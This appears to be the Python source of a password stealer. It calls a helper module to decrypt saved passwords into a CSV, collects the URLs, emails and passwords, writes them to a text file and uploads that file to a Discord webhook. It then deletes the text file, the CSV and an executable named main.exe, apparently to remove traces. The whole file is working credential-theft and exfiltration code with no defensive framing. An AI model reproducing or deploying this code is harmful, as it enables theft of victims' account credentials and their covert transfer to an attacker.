import encoding_passwords
from discord_webhook import DiscordWebhook
import os

webhook = 'YOUR_WEBHOOK_HERE'

def getitems():
    encoding_passwords.Main()
    with open('decrypted_password.csv', 'r', encoding='utf-8') as f:
        url_list = []
        username_list = []
        password_list = []

        next(f)

        for line in f:
            items = line.strip().split(',')
            index, url, email, password = items
            url_list.append(url)
            username_list.append(email)
            password_list.append(password)

    return url_list, username_list, password_list


def send_items(webhook):
    with open('passwords.txt', 'w', encoding='utf-8') as f:
        url, username, password = getitems()
        for i in range(len(url)):
            f.write(f'{url[i]}, {username[i]}, {password[i]}\n')

    with open("passwords.txt", "rb") as f:
        webhook = DiscordWebhook(url=webhook)
        webhook.add_file(file=f.read(), filename="passwords.txt")
        response = webhook.execute()


def delete_files():
    filename = 'passwords.txt'
    if os.path.exists(filename):
        os.remove(filename)
    filename = 'decrypted_password.csv'
    if os.path.exists(filename):
        os.remove(filename)
    filename = 'main.exe'
    if os.path.exists(filename):
        os.remove(filename)
def main():
    send_items(webhook)
    delete_files()

main()